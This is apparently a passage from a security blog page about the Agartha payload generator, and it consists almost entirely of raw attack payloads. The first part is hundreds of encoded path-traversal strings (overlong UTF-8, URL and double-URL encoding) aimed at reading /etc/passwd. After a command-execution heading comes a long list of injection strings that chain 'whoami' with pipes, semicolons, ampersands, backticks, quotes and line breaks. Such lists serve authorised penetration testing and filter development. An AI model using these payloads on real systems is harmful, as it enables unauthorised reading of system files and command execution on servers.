%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5cetc%c0%80%5cpasswd
%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae/etc/passwd
%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5cetc/passwd
%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5cetc%c0%80%5cpasswd
%c0ae%c0ae/etc/passwd
%c0ae%c0ae/%c0ae%c0ae/etc/passwd
%c0ae%c0ae/%c0ae%c0ae/%c0ae%c0ae/etc/passwd
%c0ae%c0ae/%c0ae%c0ae/%c0ae%c0ae/%c0ae%c0ae/etc/passwd
%c0ae%c0ae/%c0ae%c0ae/%c0ae%c0ae/%c0ae%c0ae/%c0ae%c0ae/etc/passwd
%c0ae%c0ae%c0%2fetc/passwd
%c0ae%c0ae%c0%2fetc%c0%2fpasswd
%c0ae%c0ae%c0%2f%c0ae%c0ae/etc/passwd
%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2fetc/passwd
%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2fetc%c0%2fpasswd
%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae/etc/passwd
%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2fetc/passwd
%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2fetc%c0%2fpasswd
%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae/etc/passwd
%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2fetc/passwd
%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2fetc%c0%2fpasswd
%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae/etc/passwd
%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2fetc/passwd
%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2f%c0ae%c0ae%c0%2fetc%c0%2fpasswd
%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae%c1%9cetc/passwd
%c0%ae%c0%ae%c1%9cetc%c1%9cpasswd
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cetc/passwd
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cetc%c1%9cpasswd
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cetc/passwd
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cetc%c1%9cpasswd
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cetc/passwd
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cetc%c1%9cpasswd
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cetc/passwd
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cetc%c1%9cpasswd
%c0%ae%c0%ae%c0%afetc/passwd
%c0%ae%c0%ae%c0%afetc%c0%afpasswd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e/%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e%c0%afetc/passwd
%c0%2e%c0%2e%c0%afetc%c0%afpasswd
%c0%2e%c0%2e%c0%af%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc/passwd
%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc%c0%afpasswd
%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc/passwd
%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc%c0%afpasswd
%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc/passwd
%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc%c0%afpasswd
%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc/passwd
%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc%c0%afpasswd
%c0%2e%c0%2e%c0%5cetc/passwd
%c0%2e%c0%2e%c0%5cetc%c0%5cpasswd
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cetc/passwd
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cetc%c0%5cpasswd
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cetc/passwd
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cetc%c0%5cpasswd
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cetc/passwd
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cetc%c0%5cpasswd
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cetc/passwd
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cetc%c0%5cpasswd
%c0%2e%c0%2e%c0%2fetc/passwd
%c0%2e%c0%2e%c0%2fetc%c0%2fpasswd
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/passwd
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc%c0%2fpasswd
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/passwd
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc%c0%2fpasswd
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/passwd
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc%c0%2fpasswd
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e/etc/passwd
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/passwd
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc%c0%2fpasswd
%2e%2e/etc/passwd
%2e%2e/%2e%2e/etc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%5cetc/passwd
%2e%2e%5cetc%5cpasswd
%2e%2e%5c%2e%2e/etc/passwd
%2e%2e%5c%2e%2e%5cetc/passwd
%2e%2e%5c%2e%2e%5cetc%5cpasswd
%2e%2e%5c%2e%2e%5c%2e%2e/etc/passwd
%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd
%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e/etc/passwd
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e/etc/passwd
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd
%2e%2e%2fetc/passwd
%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2fetc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%25c0%25ae%25c0%25ae/etc/passwd
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/etc/passwd
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/etc/passwd
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/etc/passwd
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/etc/passwd
%25c0%25ae%25c0%25ae%25c1%259cetc/passwd
%25c0%25ae%25c0%25ae%25c1%259cetc%25c1%259cpasswd
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae/etc/passwd
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cetc/passwd
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cetc%25c1%259cpasswd
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae/etc/passwd
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cetc/passwd
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cetc%25c1%259cpasswd
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae/etc/passwd
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cetc/passwd
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cetc%25c1%259cpasswd
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae/etc/passwd
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cetc/passwd
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259cetc%25c1%259cpasswd
%25c0%25ae%25c0%25ae%25c0%25afetc/passwd
%25c0%25ae%25c0%25ae%25c0%25afetc%25c0%25afpasswd
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae/etc/passwd
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afetc/passwd
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afetc%25c0%25afpasswd
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae/etc/passwd
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afetc/passwd
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afetc%25c0%25afpasswd
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae/etc/passwd
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afetc/passwd
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afetc%25c0%25afpasswd
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae/etc/passwd
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afetc/passwd
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afetc%25c0%25afpasswd
%252e%252e/etc/passwd
%252e%252e/%252e%252e/etc/passwd
%252e%252e/%252e%252e/%252e%252e/etc/passwd
%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
%252e%252e%255cetc/passwd
%252e%252e%255cetc%255cpasswd
%252e%252e%255c%252e%252e/etc/passwd
%252e%252e%255c%252e%252e%255cetc/passwd
%252e%252e%255c%252e%252e%255cetc%255cpasswd
%252e%252e%255c%252e%252e%255c%252e%252e/etc/passwd
%252e%252e%255c%252e%252e%255c%252e%252e%255cetc/passwd
%252e%252e%255c%252e%252e%255c%252e%252e%255cetc%255cpasswd
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e/etc/passwd
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cetc/passwd
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cetc%255cpasswd
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e/etc/passwd
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cetc/passwd
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cetc%255cpasswd
%252e%252e%252fetc/passwd
%252e%252e%252fetc%252fpasswd
%252e%252e%252f%252e%252e/etc/passwd
%252e%252e%252f%252e%252e%252fetc/passwd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e/etc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e/etc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e/etc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%%32%65%%32%65/etc/passwd
%%32%65%%32%65/%%32%65%%32%65/etc/passwd
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
%%32%65%%32%65%%35%63etc/passwd
%%32%65%%32%65%%35%63etc%%35%63passwd
%%32%65%%32%65%%35%63%%32%65%%32%65/etc/passwd
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63etc/passwd
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63etc%%35%63passwd
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65/etc/passwd
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63etc/passwd
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63etc%%35%63passwd
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65/etc/passwd
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63etc/passwd
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63etc%%35%63passwd
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65/etc/passwd
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63etc/passwd
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63etc%%35%63passwd
%%32%65%%32%65%%32%66etc/passwd
%%32%65%%32%65%%32%66etc%%32%66passwd
%%32%65%%32%65%%32%66%%32%65%%32%65/etc/passwd
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66etc/passwd
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66etc%%32%66passwd
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65/etc/passwd
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66etc/passwd
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66etc%%32%66passwd
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65/etc/passwd
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66etc/passwd
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66etc%%32%66passwd
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65/etc/passwd
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66etc/passwd
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66etc%%32%66passwd
```

### 命令执行

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\11162310.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/11162310.webp)

```swift
||whoami||
||whoami
||`whoami`||
||`whoami`
|whoami|
|whoami
|`whoami`|
|`whoami`
whoami
`whoami`
\r\n||whoami||
\r\n||whoami
\r\n||`whoami`||
\r\n||`whoami`
\r\n|whoami|
\r\n|whoami
\r\n|`whoami`|
\r\n|`whoami`
\r\nwhoami
\r\n`whoami`
\r\n\'||whoami||\'
\r\n\'||whoami\'
\r\n\'||`whoami`||\'
\r\n\'||`whoami`\'
\r\n\'||\'whoami
\r\n\'|whoami|\'
\r\n\'|whoami\'
\r\n\'|`whoami`|\'
\r\n\'|`whoami`\'
\r\n\'|\'whoami
\r\n\';whoami\'
\r\n\';whoami;\'
\r\n\';`whoami`\'
\r\n\';`whoami`;\'
\r\n\';\'whoami
\r\n\'&whoami\'
\r\n\'&whoami&\'
\r\n\'&`whoami`\'
\r\n\'&`whoami`&\'
\r\n\'&\'whoami
\r\n\'&&whoami\'
\r\n\'&&whoami&&\'
\r\n\'&&`whoami`\'
\r\n\'&&`whoami`&&\'
\r\n\'&&\'whoami
\r\n\"||whoami||\"
\r\n\"||whoami\"
\r\n\"||`whoami`||\"
\r\n\"||`whoami`\"
\r\n\"||\"whoami
\r\n\"|whoami|\"
\r\n\"|whoami\"
\r\n\"|`whoami`|\"
\r\n\"|`whoami`\"
\r\n\"|\"whoami
\r\n\";whoami\"
\r\n\";whoami;\"
\r\n\";`whoami`\"
\r\n\";`whoami`;\"
\r\n\";\"whoami
\r\n\"&whoami\"
\r\n\"&whoami&\"
\r\n\"&`whoami`\"
\r\n\"&`whoami`&\"
\r\n\"&\"whoami
\r\n\"&&whoami\"
\r\n\"&&whoami&&\"
\r\n\"&&`whoami`\"
\r\n\"&&`whoami`&&\"
\r\n\"&&\"whoami
\r\n;whoami;
\r\n;whoami
\r\n;`whoami`;
\r\n;`whoami`
\r\n'||whoami||'
\r\n'||whoami'
\r\n'||`whoami`||'
\r\n'||`whoami`'
\r\n'||'whoami
\r\n'|whoami|'
\r\n'|whoami'
\r\n'|`whoami`|'
\r\n'|`whoami`'
\r\n'|'whoami
\r\n';whoami;'
\r\n';whoami'
\r\n';`whoami`;'
\r\n';`whoami`'
\r\n';'whoami
\r\n'&whoami'
\r\n'&whoami&'
\r\n'&`whoami`'
\r\n'&`whoami`&'
\r\n'&'whoami
\r\n'&&whoami'
\r\n'&&whoami&&'
\r\n'&&`whoami`'
\r\n'&&`whoami`&&'
\r\n'&&'whoami
\r\n&whoami&
\r\n&whoami
\r\n&`whoami`&
\r\n&`whoami`
\r\n&&whoami&&
\r\n&&whoami
\r\n&&`whoami`&&
\r\n&&`whoami`
\r\n"||whoami||"
\r\n"||whoami"
\r\n"||`whoami`||"
\r\n"||`whoami`"
\r\n"||"whoami
\r\n"|whoami|"
\r\n"|whoami"
\r\n"|`whoami`|"
\r\n"|`whoami`"
\r\n"|"whoami
\r\n";whoami;"
\r\n";whoami"
\r\n";`whoami`;"
\r\n";`whoami`"
\r\n";"whoami
\r\n"&whoami&"
\r\n"&whoami"
\r\n"&`whoami`&"
\r\n"&`whoami`"
\r\n"&&whoami&&"
\r\n"&&whoami"
\r\n"&&`whoami`&&"
\r\n"&&`whoami`"
\r\n"&&"whoami
\r\n"&"whoami
\n||whoami||
\n||whoami
\n||`whoami`||
\n||`whoami`
\n|whoami|
\n|whoami
\n|`whoami`|
\n|`whoami`
\nwhoami
\n`whoami`
\n\'||whoami||\'
\n\'||whoami\'
\n\'||`whoami`||\'
\n\'||`whoami`\'
\n\'||\'whoami
\n\'|whoami|\'
\n\'|whoami\'
\n\'|`whoami`|\'
\n\'|`whoami`\'
\n\'|\'whoami
\n\';whoami\'
\n\';whoami;\'
\n\';`whoami`\'
\n\';`whoami`;\'
\n\';\'whoami
\n\'&whoami\'
\n\'&whoami&\'
\n\'&`whoami`\'
\n\'&`whoami`&\'
\n\'&\'whoami
\n\'&&whoami\'
\n\'&&whoami&&\'
